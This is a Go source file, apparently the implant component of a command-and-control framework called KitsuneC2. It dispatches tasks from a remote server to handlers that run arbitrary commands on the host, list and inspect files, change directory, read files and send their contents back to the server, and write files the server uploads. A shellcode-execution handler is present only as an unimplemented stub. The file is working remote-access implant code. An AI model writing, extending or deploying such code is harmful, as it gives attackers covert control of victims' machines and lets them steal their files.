package main

import (
	"KitsuneC2/implant/modules"
	"KitsuneC2/lib/communication"
	"errors"
	"net"
)

var MessageTypeToFunc = map[int]func(net.Conn, interface{}){
	//reserved for implant functionality
	11: handleFileInfoReq,
	13: handleLsReq,
	15: handleExecReq,
	17: handleCdReq,
	19: handleDownloadReq,
	21: handleUploadReq,
	23: handleShellcodeExecReq,
}

func handleFileInfoReq(conn net.Conn, arguments interface{}) {
	fileInfoReq, ok := arguments.(*communication.FileInfoReq)
	if !ok {
		return
	}
	results, err := modules.FileInfo(fileInfoReq.PathToFile)
	if err != nil {
		SendErrorToServer(conn, fileInfoReq.TaskId, err)
	} else {
		resp := communication.FileInfoResp{TaskId: fileInfoReq.TaskId, Name: results.Name(), Size: results.Size(), Mode: results.Mode().String(), ModTime: int(results.ModTime().Unix()), IsDir: results.IsDir()}
		SendEnvelopeToServer(conn, 12, resp)
	}
}

func handleLsReq(conn net.Conn, arguments interface{}) {
	lsReq, ok := arguments.(*communication.LsReq)
	if !ok {
		return
	}
	results, err := modules.Ls(lsReq.Path)
	if err != nil {
		SendErrorToServer(conn, lsReq.TaskId, err)
	} else {
		resp := communication.LsResp{TaskId: lsReq.TaskId, Result: results}
		SendEnvelopeToServer(conn, 14, resp)
	}
}

func handleExecReq(conn net.Conn, arguments interface{}) {
	execReq, ok := arguments.(*communication.ExecReq)
	if !ok {
		return
	}
	result, err := modules.Exec(execReq.Cmd, execReq.Args)
	if err != nil {
		SendErrorToServer(conn, execReq.TaskId, err)
	} else {
		resp := communication.ExecResp{TaskId: execReq.TaskId, Output: result}
		SendEnvelopeToServer(conn, 16, resp)
	}

}

func handleCdReq(conn net.Conn, arguments interface{}) {
	cdReq, ok := arguments.(*communication.CdReq)
	if !ok {
		return
	}
	err := modules.Cd(cdReq.Path)
	if err != nil {
		SendErrorToServer(conn, cdReq.TaskId, err)
	} else {
		resp := communication.CdResp{TaskId: cdReq.TaskId, Success: true}
		SendEnvelopeToServer(conn, 18, resp)
	}
}

func handleDownloadReq(conn net.Conn, arguments interface{}) {
	downloadReq, ok := arguments.(*communication.DownloadReq)
	if !ok {
		return
	}
	contents, err := modules.ReadFile(downloadReq.Origin)
	if err != nil {
		SendErrorToServer(conn, downloadReq.TaskId, err)
	} else {
		resp := communication.DownloadResp{TaskId: downloadReq.TaskId, Contents: contents}
		SendEnvelopeToServer(conn, 20, resp)
	}
}

func handleUploadReq(conn net.Conn, arguments interface{}) {
	UploadReq, ok := arguments.(*communication.UploadReq)
	if !ok {
		return
	}
	err := modules.WriteFile(UploadReq.File, UploadReq.Destination)
	if err != nil {
		SendErrorToServer(conn, UploadReq.TaskId, err)
	} else {
		resp := communication.UploadResp{TaskId: UploadReq.TaskId, Success: true}
		SendEnvelopeToServer(conn, 22, resp)
	}
}

// TODO
func handleShellcodeExecReq(conn net.Conn, arguments interface{}) {
	shellcodeExecReq, ok := arguments.(*communication.ShellcodeExecReq)
	if !ok {
		return
	}
	SendErrorToServer(conn, shellcodeExecReq.TaskId, errors.New("functionality not yet implemented"))
}
